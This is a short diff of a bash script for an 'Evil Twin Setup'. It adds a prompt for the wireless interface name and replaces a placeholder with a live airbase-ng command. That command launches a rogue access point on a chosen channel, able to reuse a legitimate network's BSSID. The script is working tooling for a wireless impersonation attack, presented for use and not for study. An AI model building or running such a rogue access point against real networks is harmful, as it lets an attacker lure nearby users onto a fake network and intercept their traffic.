@@ -1,6 +1,14 @@
 #!/bin/bash
 
-echo "=== Evil Twin Setup ==="
+# Ask for interface
+while true; do
+    read -rp "Enter wireless interface name (e.g., wlan1mon): " IFACE
+    if [[ -n "$IFACE" ]]; then
+        break
+    else
+        echo "Interface name cannot be empty."
+    fi
+done
 
 # Ask if we should use the same BSSID
 while true; do
@@ -32,7 +40,8 @@ else
 fi
 
 echo "[+] Selected Channel: $CHANNEL"
+echo "[+] Using Interface: $IFACE"
 
-# Example placeholder for launching airbase-ng
-# Replace with actual logic or commands
-airbase-ng -e malmalmal -a $BSSID -c $CHANNEL wlan1mon
+# Launch airbase-ng
+echo "[*] Launching airbase-ng..."
+airbase-ng -e malmalmal -a "$BSSID" -c "$CHANNEL" "$IFACE"
